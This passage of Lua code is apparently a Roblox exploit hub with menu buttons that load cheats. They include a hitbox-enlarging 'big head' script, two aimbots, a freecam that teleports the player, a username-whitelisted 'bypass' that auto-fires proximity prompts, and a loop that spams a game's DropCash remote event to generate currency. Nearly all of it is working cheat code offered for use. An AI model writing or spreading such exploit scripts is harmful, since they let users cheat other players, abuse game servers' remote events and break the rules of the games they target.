		}
	end
end

local function updateHead(head, player)
	if not head or player == LocalPlayer then return end
	storeOriginal(player, head)

	if not _G.Disabled then
		head.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
		head.Transparency = _G.HeadTransparency
		head.BrickColor = BrickColor.new("Really red")
		head.Material = Enum.Material.Neon
		head.CanCollide = false
		head.Massless = true
	else
		local data = Original[player]
		if data then
			head.Size = data.Size
			head.Transparency = data.Transparency
			head.BrickColor = data.Color
			head.Material = data.Material
			head.CanCollide = data.Collide
			head.Massless = data.Massless
		end
	end
end

RunService.RenderStepped:Connect(function()
	for _, p in pairs(Players:GetPlayers()) do
		if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("Head") then
			pcall(function()
				updateHead(p.Character.Head, p)
			end)
		end
	end
end)

Players.PlayerAdded:Connect(function(p)
	p.CharacterAdded:Connect(function(c)
		c:WaitForChild("Head")
		updateHead(c.Head, p)
	end)
end)

--// GUI
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)

local function round(obj, r)
	local c = Instance.new("UICorner", obj)
	c.CornerRadius = UDim.new(0, r)
end

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 220, 0, 180)
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.new(0,0,0)
Frame.Active = true
Frame.Draggable = true
round(Frame, 10)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 25)
Title.BackgroundTransparency = 1
Title.Text = "BIG HEAD SCRIPT"
Title.TextColor3 = Color3.new(0,0,0)
Title.Font = Enum.Font.Roboto
Title.TextSize = 16

-------------------------------------------------
-- SIZE SLIDER (WHITE)
-------------------------------------------------
local SliderBack = Instance.new("Frame", Frame)
SliderBack.Size = UDim2.new(0.8, 0, 0, 6)
SliderBack.Position = UDim2.new(0.1, 0, 0.27, 0)
SliderBack.BackgroundColor3 = Color3.new(0,0,0)
round(SliderBack, 8)

local SliderFill = Instance.new("Frame", SliderBack)
SliderFill.Size = UDim2.new(0, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.new(1,1,1)
round(SliderFill, 8)

local SliderButton = Instance.new("TextButton", SliderBack)
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0, -10, 0.5, -10)
SliderButton.BackgroundColor3 = Color3.new(1,1,1)
SliderButton.Text = ""
round(SliderButton, 10)

local SizeLabel = Instance.new("TextLabel", Frame)
SizeLabel.Size = UDim2.new(1, 0, 0, 20)
SizeLabel.Position = UDim2.new(0, 0, 0.35, 0)
SizeLabel.BackgroundTransparency = 1
SizeLabel.TextColor3 = Color3.new(0,0,0)
SizeLabel.Text = "Size: " .. _G.HeadSize

local draggingSize = false

local function updateSize(percent)
	percent = math.clamp(percent, 0, 1)
	SliderFill.Size = UDim2.new(percent, 0, 1, 0)
	SliderButton.Position = UDim2.new(percent, -10, 0.5, -10)
	_G.HeadSize = 1 + percent * 34
	SizeLabel.Text = "Size: " .. string.format("%.1f", _G.HeadSize)
end

SliderButton.MouseButton1Down:Connect(function() draggingSize = true end)
UIS.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then draggingSize = false end end)
UIS.InputChanged:Connect(function(input)
	if draggingSize and input.UserInputType == Enum.UserInputType.MouseMovement then
		updateSize((UIS:GetMouseLocation().X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X)
	end
end)

-------------------------------------------------
-- TRANSPARENCY SLIDER (WHITE)
-------------------------------------------------
local TBack = Instance.new("Frame", Frame)
TBack.Size = UDim2.new(0.8, 0, 0, 6)
TBack.Position = UDim2.new(0.1, 0, 0.55, 0)
TBack.BackgroundColor3 = Color3.new(0,0,0)
round(TBack, 8)

local TFill = Instance.new("Frame", TBack)
TFill.Size = UDim2.new(_G.HeadTransparency, 0, 1, 0)
TFill.BackgroundColor3 = Color3.new(1,1,1)
round(TFill, 8)

local TButton = Instance.new("TextButton", TBack)
TButton.Size = UDim2.new(0, 20, 0, 20)
TButton.Position = UDim2.new(_G.HeadTransparency, -10, 0.5, -10)
TButton.BackgroundColor3 = Color3.new(1,1,1)
TButton.Text = ""
round(TButton, 10)

local TLabel = Instance.new("TextLabel", Frame)
TLabel.Size = UDim2.new(1, 0, 0, 20)
TLabel.Position = UDim2.new(0, 0, 0.62, 0)
TLabel.BackgroundTransparency = 1
TLabel.TextColor3 = Color3.new(0,0,0)
TLabel.Text = "Transparency: " .. string.format("%.2f", _G.HeadTransparency)

local draggingT = false

local function updateTransparency(percent)
	percent = math.clamp(percent, 0, 1)
	TFill.Size = UDim2.new(percent, 0, 1, 0)
	TButton.Position = UDim2.new(percent, -10, 0.5, -10)
	_G.HeadTransparency = percent
	TLabel.Text = "Transparency: " .. string.format("%.2f", percent)
end

TButton.MouseButton1Down:Connect(function() draggingT = true end)
UIS.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then draggingT = false end end)
UIS.InputChanged:Connect(function(input)
	if draggingT and input.UserInputType == Enum.UserInputType.MouseMovement then
		updateTransparency((UIS:GetMouseLocation().X - TBack.AbsolutePosition.X) / TBack.AbsoluteSize.X)
	end
end)

-------------------------------------------------
-- TOGGLE
-------------------------------------------------
local ToggleButton = Instance.new("TextButton", Frame)
ToggleButton.Size = UDim2.new(0.8, 0, 0, 25)
ToggleButton.Position = UDim2.new(0.1, 0, 0.8, 0)
ToggleButton.BackgroundColor3 = Color3.new(0,0,0)
ToggleButton.TextColor3 = Color3.new(0,0,0)
ToggleButton.Text = "Disabled: On"
round(ToggleButton, 10)

ToggleButton.MouseButton1Click:Connect(function()
	_G.Disabled = not _G.Disabled
	ToggleButton.Text = _G.Disabled and "Disabled: On" or "Disabled: Off"
end)

updateSize((_G.HeadSize - 1) / 34)
updateTransparency(_G.HeadTransparency)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PERSONAL SCRIPT FOR (VASCO)", function()
	--// CONFIG
_G.HeadSize = 1 -- Start at 1x size
_G.Disabled = true -- Start disabled for big head
_G.AimEnabled = false -- Start disabled for aimbot
_G.Smoothness = 1 -- Lower value for smoother aimbot tracking
_G.AimbotMode = "Instant" -- Options: "Instant", "Smooth"
_G.FOV = 4 -- Field of View in degrees

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")
local Mouse = LocalPlayer:GetMouse()
local Camera = workspace.CurrentCamera

--// ORIGINAL STORAGE
local OriginalSizes = {}
local OriginalTrans = {}
local OriginalBrickColor = {}
local OriginalMaterial = {}
local OriginalCanCollide = {}
local OriginalMassless = {}

--// HEAD SIZE FUNCTIONS
local function updateHead(head, player)
    if head and player ~= LocalPlayer then
        local key = player
        if not OriginalSizes[key] then
            OriginalSizes[key] = head.Size
            OriginalTrans[key] = head.Transparency
            OriginalBrickColor[key] = head.BrickColor
            OriginalMaterial[key] = head.Material
            OriginalCanCollide[key] = head.CanCollide
            OriginalMassless[key] = head.Massless
        end
        if not _G.Disabled then
            head.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
            head.Transparency = 1 -- Fully invisible
            head.BrickColor = BrickColor.new("Red")
            head.Material = Enum.Material.Neon
            head.CanCollide = false
            head.Massless = true
        else
            -- Restore original properties when disabled
            head.Size = OriginalSizes[key]
            head.Transparency = OriginalTrans[key]
            head.BrickColor = OriginalBrickColor[key]
            head.Material = OriginalMaterial[key]
            head.CanCollide = OriginalCanCollide[key]
            head.Massless = OriginalMassless[key]
        end
    end
end

--// AIMBOT FUNCTIONS
local function getTargetPart(character)
    local head = character:FindFirstChild("Head")
    local neck = character:FindFirstChild("Neck")
    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
    local upperTorso = character:FindFirstChild("UpperTorso")
    local neckAttachment = upperTorso and upperTorso:FindFirstChild("NeckAttachment")
    if head then
        return head.Position
    elseif neck then
        return neck.CFrame.Position
    elseif neckAttachment then
        return neckAttachment.WorldPosition
    elseif humanoidRootPart then
        return humanoidRootPart.Position
    end
    return nil
end

local function getClosestPlayer()
    local closestTarget = nil
    local shortestDistance = math.huge
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local character = player.Character
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid and humanoid.Health > 0 then
                humanoid.Died:Connect(function()
                    player.Character = player.CharacterAdded:Wait()
                end)
                local targetPos = getTargetPart(character)
                if targetPos then
                    local distance = (LocalPlayer.Character.HumanoidRootPart.Position - targetPos).Magnitude
                    local screenPoint, onScreen = Camera:WorldToScreenPoint(targetPos)
                    if onScreen then
                        local toTarget = (targetPos - Camera.CFrame.Position).unit
                        local cameraForward = Camera.CFrame.LookVector
                        local angle = math.acos(cameraForward:Dot(toTarget)) * (180 / math.pi)
                        if angle <= _G.FOV and distance < shortestDistance then
                            shortestDistance = distance
                            closestTarget = targetPos
                        end
                    end
                end
            end
        end
    end
    return closestTarget
end

local function aimAtTarget()
    local target = getClosestPlayer()
    if target then
        if _G.AimbotMode == "Instant" then
            Camera.CFrame = CFrame.new(Camera.CFrame.Position, target)
        elseif _G.AimbotMode == "Smooth" then
            Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, target), _G.Smoothness)
        end
    end
end

--// UPDATE LOOP
RunService.RenderStepped:Connect(function()
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character then
            local head = player.Character:FindFirstChild("Head")
            if head then
                pcall(function()
                    updateHead(head, player)
                end)
            end
        end
    end
    if _G.AimEnabled and UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
        aimAtTarget()
    end
end)

--// INITIAL AND CONNECTIONS
for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        if player.Character then
            local head = player.Character:FindFirstChild("Head")
            if head then
                updateHead(head, player)
            end
        end
        player.CharacterAdded:Connect(function(char)
            char:WaitForChild("Head")
            updateHead(char.Head, player)
        end)
    end
end

Players.PlayerAdded:Connect(function(player)
    if player ~= LocalPlayer then
        player.CharacterAdded:Connect(function(char)
            char:WaitForChild("Head")
            updateHead(char.Head, player)
        end)
    end
end)

--// GUI SETUP
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local SliderBack = Instance.new("Frame")
local SliderFill = Instance.new("Frame")
local SliderButton = Instance.new("TextButton")
local SizeLabel = Instance.new("TextLabel")
local HeadToggleButton = Instance.new("TextButton")
local AimToggleButton = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui

-- Frame
Frame.Size = UDim2.new(0, 220, 0, 180) -- Increased height for two buttons
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

-- Title
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "PERSONAL PABLOVASCO"
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.TextSize = 16
Title.Font = Enum.Font.Roboto
Title.Parent = Frame

-- Slider background
SliderBack.Size = UDim2.new(0.8, 0, 0, 6)
SliderBack.Position = UDim2.new(0.1, 0, 0.25, 0)
SliderBack.BackgroundColor3 = Color3.fromRGB(255,255,255)
SliderBack.BorderSizePixel = 0
SliderBack.Parent = Frame

-- Slider fill
SliderFill.Size = UDim2.new(0, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SliderFill.BorderSizePixel = 0
SliderFill.Parent = SliderBack

-- Slider button
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0, -10, 0.5, -10)
SliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SliderButton.Text = ""
SliderButton.BorderSizePixel = 0
SliderButton.Parent = SliderBack

-- Size text display
SizeLabel.Size = UDim2.new(1, 0, 0, 20)
SizeLabel.Position = UDim2.new(0, 0, 0.35, 0)
SizeLabel.BackgroundTransparency = 1
SizeLabel.TextColor3 = Color3.fromRGB(0,0,0)
SizeLabel.TextSize = 14
SizeLabel.Font = Enum.Font.Roboto
SizeLabel.Text = "Size: " .. string.format("%.1f", _G.HeadSize)
SizeLabel.Parent = Frame

-- Head toggle button
HeadToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
HeadToggleButton.Position = UDim2.new(0.1, 0, 0.5, 0)
HeadToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
HeadToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
HeadToggleButton.TextColor3 = Color3.fromRGB(0,0,0)
HeadToggleButton.TextSize = 14
HeadToggleButton.Font = Enum.Font.Roboto
HeadToggleButton.Text = ""
HeadToggleButton.Parent = Frame

-- Aimbot toggle button
AimToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
AimToggleButton.Position = UDim2.new(0.1, 0, 0.7, 0)
AimToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
AimToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
AimToggleButton.TextColor3 = Color3.fromRGB(0,0,0)
AimToggleButton.TextSize = 14
AimToggleButton.Font = Enum.Font.Roboto
AimToggleButton.Text = "Combine: Off"
AimToggleButton.Parent = Frame

-- Size slider logic
local dragging = false
local function updateSize(percent)
    percent = math.clamp(percent, 0, 1)
    SliderFill.Size = UDim2.new(percent, 0, 1, 0)
    SliderButton.Position = UDim2.new(percent, -10, 0.5, -10)
    local newSize = 1 + percent * 9
    _G.HeadSize = newSize
    SizeLabel.Text = "Size: " .. string.format("%.1f", newSize)
end

SliderButton.MouseButton1Down:Connect(function()
    dragging = true
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local mousePos = UIS:GetMouseLocation()
        local percent = (mousePos.X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X
        updateSize(percent)
    end
end)

-- Head toggle
HeadToggleButton.MouseButton1Click:Connect(function()
    _G.Disabled = not _G.Disabled
    if _G.Disabled then
        HeadToggleButton.Text = ""
        HeadToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
        HeadToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
    else
        HeadToggleButton.Text = ""
        HeadToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
        HeadToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
    end
end)

-- Aimbot toggle
AimToggleButton.MouseButton1Click:Connect(function()
    _G.AimEnabled = not _G.AimEnabled
    if _G.AimEnabled then
        AimToggleButton.Text = "Combine: On"
        AimToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
        AimToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
    else
        AimToggleButton.Text = "Combine: Off"
        AimToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
        AimToggleButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
    end
end)

-- Initial setup
updateSize((_G.HeadSize - 1) / 9)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("FREECAM TELEPORT PRESS Q (MONSY)", function()
	-- Services
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local cam = workspace.CurrentCamera

-- Settings
local MOVE_SPEED = 100
local SPRINT_MULTIPLIER = 2
local MOUSE_SENSITIVITY = 0.45
local MAX_PITCH = 90

-- State
local enabled = false
local yaw = 0
local pitch = 0
local moveDir = Vector3.new()
local sprint = false
local originalCameraType
local originalMouseBehavior
local originalMouseIconEnabled
local humanoid
local savedWalkSpeed
local savedJumpPower
local justToggled = false
local lastCamCFrame -- ✅ store final freecam position

-- Helpers
local function addKeyDirection(key)
	if key == Enum.KeyCode.W then moveDir += Vector3.new(0,0,1) end
	if key == Enum.KeyCode.S then moveDir += Vector3.new(0,0,-1) end
	if key == Enum.KeyCode.A then moveDir += Vector3.new(-1,0,0) end
	if key == Enum.KeyCode.D then moveDir += Vector3.new(1,0,0) end
	if key == Enum.KeyCode.Space then moveDir += Vector3.new(0,1,0) end
	if key == Enum.KeyCode.LeftControl or key == Enum.KeyCode.C then moveDir += Vector3.new(0,-1,0) end
end

local function removeKeyDirection(key)
	if key == Enum.KeyCode.W then moveDir -= Vector3.new(0,0,1) end
	if key == Enum.KeyCode.S then moveDir -= Vector3.new(0,0,-1) end
	if key == Enum.KeyCode.A then moveDir -= Vector3.new(-1,0,0) end
	if key == Enum.KeyCode.D then moveDir -= Vector3.new(1,0,0) end
	if key == Enum.KeyCode.Space then moveDir -= Vector3.new(0,1,0) end
	if key == Enum.KeyCode.LeftControl or key == Enum.KeyCode.C then moveDir -= Vector3.new(0,-1,0) end
end

-- ✅ Toggle freecam + TP on exit
local function toggleFreecam()
	enabled = not enabled
	moveDir = Vector3.new()
	sprint = false
	justToggled = true

	if enabled then
		-- Save original states
		originalCameraType = cam.CameraType
		originalMouseBehavior = UserInputService.MouseBehavior
		originalMouseIconEnabled = UserInputService.MouseIconEnabled

		-- Freeze character
		if player.Character then
			humanoid = player.Character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				savedWalkSpeed = humanoid.WalkSpeed
				savedJumpPower = humanoid.JumpPower
				humanoid.WalkSpeed = 0
				humanoid.JumpPower = 0
			end
		end

		-- Set yaw/pitch
		local x, y, z = cam.CFrame:ToEulerAnglesYXZ()
		pitch = math.deg(x)
		yaw = math.deg(y)

		cam.CameraType = Enum.CameraType.Scriptable
		UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
		UserInputService.MouseIconEnabled = false
	else
		-- ✅ Save final camera position before restoring
		lastCamCFrame = cam.CFrame

		-- Restore character movement
		if humanoid then
			humanoid.WalkSpeed = savedWalkSpeed or 16
			humanoid.JumpPower = savedJumpPower or 50
		end
		cam.CameraType = originalCameraType or Enum.CameraType.Custom
		UserInputService.MouseBehavior = originalMouseBehavior or Enum.MouseBehavior.Default
		UserInputService.MouseIconEnabled = originalMouseIconEnabled

		-- ✅ Teleport character where freecam stopped
		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and lastCamCFrame then
			player.Character.HumanoidRootPart.CFrame = CFrame.new(lastCamCFrame.Position)
		end
	end
end

-- Keybind
UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end

	if input.KeyCode == Enum.KeyCode.Q then
		toggleFreecam()
		return
	end

	if justToggled then return end

	if enabled and input.UserInputType == Enum.UserInputType.Keyboard then
		if input.KeyCode == Enum.KeyCode.LeftShift then
			sprint = true
		else
			addKeyDirection(input.KeyCode)
		end
	end
end)

UserInputService.InputEnded:Connect(function(input, gpe)
	if gpe or not enabled then return end
	if justToggled then return end

	if input.KeyCode == Enum.KeyCode.LeftShift then
		sprint = false
	else
		removeKeyDirection(input.KeyCode)
	end
end)

-- Mouse look
UserInputService.InputChanged:Connect(function(input, gpe)
	if not enabled then return end
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		yaw -= input.Delta.X * MOUSE_SENSITIVITY
		pitch = math.clamp(pitch - input.Delta.Y * MOUSE_SENSITIVITY, -MAX_PITCH, MAX_PITCH)
	end
end)

-- Camera movement
RunService.RenderStepped:Connect(function(dt)
	if justToggled then
		justToggled = false
	end
	if not enabled then return end

	local rot = CFrame.Angles(0, math.rad(yaw), 0) * CFrame.Angles(math.rad(pitch), 0, 0)
	local localMove = (rot.RightVector * moveDir.X + rot.UpVector * moveDir.Y + rot.LookVector * moveDir.Z)
	local speed = MOVE_SPEED * (sprint and SPRINT_MULTIPLIER or 1)
	local newPos = cam.CFrame.Position + localMove * speed * dt
	cam.CFrame = CFrame.new(newPos) * rot
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PERSONAL SCRIPT TBC (VASCO)", function()
	local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

local WhitelistedUsernames = {
    "Gian_Hitsdiff",
	"PeanutGaming_1",
	"theyluvzmonsy",
}

if not table.find(WhitelistedUsernames, LocalPlayer.Name) then
    return
end

for _, prompt in ipairs(Workspace:GetDescendants()) do
    if prompt:IsA("ProximityPrompt") then
        prompt.HoldDuration = 0
        prompt.RequiresLineOfSight = false
    end
end

Workspace.DescendantAdded:Connect(function(obj)
    if obj:IsA("ProximityPrompt") then
        obj.HoldDuration = 0
        obj.RequiresLineOfSight = false
    end
end)

local function getClosestFrontPrompt()
    local char = LocalPlayer.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    local hrp = char.HumanoidRootPart
    local closest = nil
    local closestDist = math.huge
    local lookVector = hrp.CFrame.LookVector

    for _, prompt in ipairs(Workspace:GetDescendants()) do
        if prompt:IsA("ProximityPrompt") and prompt.Enabled then
            local part = prompt.Parent
            if part and part:IsA("BasePart") then
                local dist = (part.Position - hrp.Position).Magnitude
                if dist <= prompt.MaxActivationDistance then
                    local dir = (part.Position - hrp.Position).Unit
                    if lookVector:Dot(dir) > 0.75 and dist < closestDist then
                        closestDist = dist
                        closest = prompt
                    end
                end
            end
        end
    end
    return closest
end

UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.E then
        local prompt = getClosestFrontPrompt()
        if prompt then
            fireproximityprompt(prompt)
        end
    end
end)

local playerGui = LocalPlayer:WaitForChild("PlayerGui")
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = playerGui

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 170, 0, 90)
frame.Position = UDim2.new(0.38, 0, 0.35, 0)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner", frame)
corner.CornerRadius = UDim.new(0, 14)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 28)
title.BackgroundTransparency = 1
title.Text = "MONSY BYPASS"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.Roboto
title.TextSize = 18

local toggle = Instance.new("TextButton", frame)
toggle.Size = UDim2.new(0.8, 0, 0, 35)
toggle.Position = UDim2.new(0.1, 0, 0.45, 0)
toggle.BackgroundColor3 = Color3.new(0, 0, 0)
toggle.TextColor3 = Color3.new(1, 1, 1)
toggle.Text = "OFF"
toggle.Font = Enum.Font.Roboto
toggle.TextSize = 18

local toggleCorner = Instance.new("UICorner", toggle)
toggleCorner.CornerRadius = UDim.new(0, 12)

local glow = Instance.new("UIStroke", toggle)
glow.Color = Color3.fromRGB(0, 255, 0)
glow.Thickness = 3
glow.Enabled = false

local running = false

local CleanFolder = Workspace:WaitForChild("CommunityServiceArea"):WaitForChild("CleanFolder")

task.spawn(function()
    while task.wait(0.001) do
        if running then
            for _, obj in ipairs(CleanFolder:GetChildren()) do
                local prompt = obj:FindFirstChildOfClass("ProximityPrompt")
                if prompt then
                    pcall(fireproximityprompt, prompt)
                end
            end
        end
    end
end)

toggle.MouseButton1Click:Connect(function()
    running = not running
    if running then
        toggle.Text = "ON"
        glow.Enabled = true
    else
        toggle.Text = "OFF"
        glow.Enabled = false
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CASH DROP (MONSY)", function()
	-- PUBLIC ENEMY CASH DROP — FULL WHITE THEME + BLACK TEXT
-- Mas maliit, mas malinis, zero dark elements

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Main Frame (Pure White)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 310, 0, 195)
frame.Position = UDim2.new(0.5, -155, 0.5, -97)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.new(1,1,1)     -- pure white
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 16)

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,44)
title.BackgroundTransparency = 1
title.Text = "PUBLIC ENEMY CASH"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 22
title.Parent = frame

-- Username Box (White bg na rin!)
local userBox = Instance.new("TextBox")
userBox.Size = UDim2.new(1,-40,0,40)
userBox.Position = UDim2.new(0,20,0,55)
userBox.BackgroundColor3 = Color3.new(1,1,1)        -- white bg
userBox.Text = player.Name
userBox.TextColor3 = Color3.new(0,0,0)
userBox.Font = Enum.Font.Roboto
userBox.TextSize = 16
userBox.TextXAlignment = Enum.TextXAlignment.Left
userBox.TextEditable = false
userBox.ClearTextOnFocus = false
userBox.Parent = frame
Instance.new("UICorner", userBox).CornerRadius = UDim.new(0,10)
local pad1 = Instance.new("UIPadding", userBox)
pad1.PaddingLeft = UDim.new(0,14)

-- Amount Box (White bg na rin!)
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1,-40,0,40)
amountBox.Position = UDim2.new(0,20,0,105)
amountBox.BackgroundColor3 = Color3.new(1,1,1)   -- white bg
amountBox.PlaceholderText = "Enter amount (ex: 0.1)"
amountBox.Text = "0.1"
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.Font = Enum.Font.Roboto
amountBox.TextSize = 16
amountBox.TextXAlignment = Enum.TextXAlignment.Left
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0,10)
local pad2 = Instance.new("UIPadding", amountBox)
pad2.PaddingLeft = UDim.new(0,14)
pad2.Parent = amountBox

-- START & STOP Buttons
local startBtn = Instance.new("TextButton")
startBtn.Size = UDim2.new(0.48,0,0,44)
startBtn.Position = UDim2.new(0,20,1,-20)
startBtn.AnchorPoint = Vector2.new(0,1)
startBtn.BackgroundColor3 = Color3.new(1,1,1)
startBtn.Text = "START"
startBtn.TextColor3 = Color3.new(0,0,0)
startBtn.Font = Enum.Font.Roboto
startBtn.TextSize = 19
startBtn.Parent = frame
Instance.new("UICorner", startBtn).CornerRadius = UDim.new(0,12)

local stopBtn = Instance.new("TextButton")
stopBtn.Size = UDim2.new(0.48,0,0,44)
stopBtn.Position = UDim2.new(0.52,0,1,-20)
stopBtn.AnchorPoint = Vector2.new(0,1)
stopBtn.BackgroundColor3 = Color3.new(1,1,1)
stopBtn.Text = "STOP"
stopBtn.TextColor3 = Color3.new(0,0,0)
stopBtn.Font = Enum.Font.Roboto
stopBtn.TextSize = 19
stopBtn.Parent = frame
Instance.new("UICorner", stopBtn).CornerRadius = UDim.new(0,12)

-- Status
local status = Instance.new("TextLabel")
status.Size = UDim2.new(1,0,0,25)
status.Position = UDim2.new(0,0,1,-28)
status.BackgroundTransparency = 1
status.Text = "Status: Idle"
status.TextColor3 = Color3.fromRGB(80,80,80)
status.Font = Enum.Font.Roboto
status.TextSize = 14
status.Parent = frame

-- Logic (same pero mas malinis)
local running = false

startBtn.MouseButton1Click:Connect(function()
    if running then return end
    running = true
    status.Text = "Status: Dropping cash..."
    status.TextColor3 = Color3.fromRGB(0,120,0)

    task.spawn(function()
        while running do
            local amt = tonumber(amountBox.Text) or 0.1
            ReplicatedStorage.DropCash:FireServer(player.Name, amt)
            task.wait(0.05)
        end
    end)
end)

stopBtn.MouseButton1Click:Connect(function()
    running = false
    status.Text = "Status: Idle"
    status.TextColor3 = Color3.fromRGB(80,80,80)
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PERSONAL SCRIPT FOR (CHESTER)", function()
	--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

--// AIMBOT SETTINGS
local AimEnabled = false
local AimbotMode = "Instant"
local Smoothness = 1
local BaseFOV = 5

--// CROSSHAIR DATA
local Crosshairs = {
    {id = 1827745860, name = "Dot", fovMult = 0.5},
    {id = 5998624788, name = "Circle", fovMult = 1.2},
    {id = 749187669, name = "Cross", fovMult = 1.0},
    {id = 1469004289, name = "Small X", fovMult = 0.7},
    {id = 11722368344, name = "Big Circle", fovMult = 2.0},
    {id = 2614612882, name = "Thin Cross", fovMult = 0.8},
    {id = 749187664, name = "Plus", fovMult = 0.9},
    {id = 251435889, name = "Classic", fovMult = 1.1},
    {id = 5143056985, name = "Red Dot", fovMult = 0.6},
    {id = 11759202791, name = "Holo", fovMult = 1.5},
    {id = 1478500977, name = "Star", fovMult = 1.3},
    {id = 11726821301, name = "Neon", fovMult = 1.1},
    {id = 5536063313, name = "Target", fovMult = 1.4},
    {id = 11746928636, name = "Scope", fovMult = 1.8},
    {id = 11759198682, name = "Ring", fovMult = 1.6},
    {id = 11826465934, name = "Hex", fovMult = 1.0},
    {id = 11927593271, name = "Glow", fovMult = 1.7},
    {id = 11867351018, name = "Tech", fovMult = 1.2},
    {id = 4048495272,   name = "Pulse", fovMult = 0.9},
    {id = 10891594364,  name = "Vortex", fovMult = 1.4},
    {id = 5998624778,   name = "Mini Dot", fovMult = 0.6},
    {id = 2207556774,   name = "Arrow", fovMult = 1.1},
    {id = 426730675,    name = "Bracket", fovMult = 1.0},
    {id = 11754490336,  name = "Hollow", fovMult = 1.3},
    {id = 10868459554,  name = "Trident", fovMult = 1.2},
